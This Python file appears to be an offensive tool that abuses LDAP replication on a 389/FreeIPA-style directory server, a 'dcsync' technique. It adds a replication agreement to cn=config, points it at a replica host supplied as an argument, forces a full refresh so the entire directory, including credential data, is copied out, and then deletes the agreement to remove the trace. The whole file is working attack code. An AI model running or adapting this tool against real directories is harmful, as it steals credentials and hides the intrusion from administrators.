import time

from ldap3 import Server, Connection, ALL
from ldap3.core.exceptions import LDAPException


def check_replica_container(conn, replica_root, config_base="cn=config"):
    replica_container_dn = f'cn={replica_root.replace(",", chr(92) + ",")},cn=mapping tree,{config_base}'
    search_filter = '(objectClass=nsds5replica)'

    if not conn.search(replica_container_dn, search_filter, attributes=['dn']):
        if conn.last_error:
            print(f"Error checking replica container: {conn.last_error}")
        return False

    return conn.entries

def add_ldap_entry(ldap_url, bind_dn, bind_pw, entry_data, replica_root, config_base="cn=config"):
    try:
        server = Server(ldap_url, get_info=ALL)
        with Connection(server, bind_dn, bind_pw, auto_bind=True) as conn:
            replica_dn = check_replica_container(conn, entry_data['attributes']['nsDS5ReplicaRoot'][0], config_base)
            if not replica_dn:
                print("Error: Replica container not found. Please create cn=replica first. Or you don't have permission to access.")
                print("Try to create replica")
                return None
            dn = "cn=dcsync," + replica_dn[0].entry_dn
            if not conn.add(dn, attributes=entry_data['attributes']):
                raise LDAPException(f"Failed to add entry: {conn.last_error}")
            print(f"Successfully added entry: {dn}")
            return dn
    except LDAPException as e:
        print(f"LDAP error: {e}")
        return None


def delete_agreement(ldap_url, bind_dn, bind_pw, dn_to_delete):
    try:
        server = Server(ldap_url, get_info=ALL)
        with Connection(server, bind_dn, bind_pw, auto_bind=True, receive_timeout=1) as conn:
            if not conn.delete(dn_to_delete):
                print(f"Failed to delete entry: {conn.last_error}")
                return False
            print(f"Successfully deleted entry: {dn_to_delete}")
            return True
    except LDAPException as e:
        print(f"LDAP error during deletion: {e}")
        return False


def sync(args, q, timeout):
    # Prepare entry data
    entry_data = {
        'attributes': {
            'objectClass': ['top', 'nsDS5ReplicationAgreement'],
            'cn': ['dcsync'],
            'description': ['dcsync'],
            'nsDS5ReplicaBindDN': ['cn=replication manager,cn=config'],
            'nsDS5ReplicaBindMethod': ['SIMPLE'],
            'nsDS5ReplicaCredentials': ['password'],
            'nsDS5ReplicaHost': [args.replica_host],
            'nsDS5ReplicaPort': [args.replica_port],
            'nsDS5ReplicaRoot': [args.replica_root],
            'nsDS5ReplicaTransportInfo': ['LDAP'],
            'nsds5replicaUpdateInProgress': ['FALSE'],
            'nsds5BeginReplicaRefresh': ['start']
        }
    }

    # Add entry
    dn = add_ldap_entry(args.ldap_url, args.bind_dn, args.bind_pw, entry_data, args.replica_root)
    if not dn:
        exit(1)

    # Wait replication
    q.put("All ok")
    time.sleep(timeout)

    # Delete entry
    result = q.get()
    if result == "Delete agreement":
        delete_agreement(args.ldap_url, args.bind_dn, args.bind_pw, dn)

